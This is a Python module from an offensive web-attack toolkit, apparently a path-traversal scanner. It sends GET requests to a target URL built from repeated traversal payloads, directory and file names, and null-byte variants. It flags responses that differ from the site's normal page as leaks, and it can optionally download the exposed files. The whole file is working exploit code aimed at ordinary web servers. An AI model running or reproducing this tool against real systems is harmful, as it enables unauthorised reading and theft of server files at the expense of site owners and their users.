#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

from core.methods.session import session
import requests
from core.colors import color
from core.variables import payloadlist
from core.methods.filecheck import filecheck
from core.methods.loot import download

def inpath(url,url2,keyword,files,dirs,depth,verbose,dl,summary,selected_payloads):
    found=[]
    urls = []
    s = session()
    if not url.endswith("/"):
        url += "/"
    con2 = requests.get(url).content
    for dir in dirs:
        for file in files:
            d=1
            while d <= depth:
                for i in selected_payloads:
                    traverse=''
                    j=1
                    while j <= d:
                        traverse+=i
                        j+=1
                    requestlist = []
                    path = traverse+dir+file+url2
                    req = requests.Request(method='GET', url=url)
                    prep = req.prepare()
                    prep.url = url + path
                    r = s.send(prep)
                    requestlist.append(r)
                    path2=traverse+dir+file+"%00"+url2
                    req = requests.Request(method='GET', url=url)
                    prep = req.prepare()
                    prep.url = url + path2
                    r = s.send(prep)
                    requestlist.append(r)
                    for r in requestlist:
                        if str(r.status_code).startswith("2") or r.status_code == 302:
                            if filecheck(r.content, con2):
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                if dl and dir+file not in found:
                                    download(r.url,dir+file)
                                found.append(dir+file)
                                vlnlist = r.url.split("/")[1::]
                                vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
                        #FIXME removed for false positives
                        #elif r.status_code == 403:
                        #    print(str(con2)+"\n----------------------------------------------------------------\n"+str(r.content))
                        #    print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                        #    found.append(dir+file)
                        #    vlnlist = r.url.split("/")[1::]
                        #    vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                        #    urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
                        else:
                            if verbose:
                                print(color.RD+"{}|: ".format(r.status_code)+color.END+color.RC+r.url+color.END)
                d+=1
    return (found, urls)

 
def determine_payloads_inpath(url,url2,keyword,verbose,depth,paylist,file):
    payloads = []
    s = session()
    con2 = requests.get(url).content
    for i in paylist:
        d = 5
        while d <= depth:
            traverse=''
            j=1
            while j <= d:
                traverse+=i
                j+=1
            requestlist = []
            path = traverse+file+url2
            req = requests.Request(method='GET', url=url)
            prep = req.prepare()
            prep.url = url + path
            r = s.send(prep)
            requestlist.append(r)
            path2=traverse+file+"%00"+url2
            req = requests.Request(method='GET', url=url)
            prep = req.prepare()
            prep.url = url + path2
            r = s.send(prep)
            requestlist.append(r)
            found = False
            for r in requestlist:
                if str(r.status_code).startswith("2") or r.status_code == 302: # or r.status_code == 403:
                    if filecheck(r.content, con2):
                        payloads.append(i)
                        found = True
                        print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
            d+=1
            if found:
                break
    
    return payloads

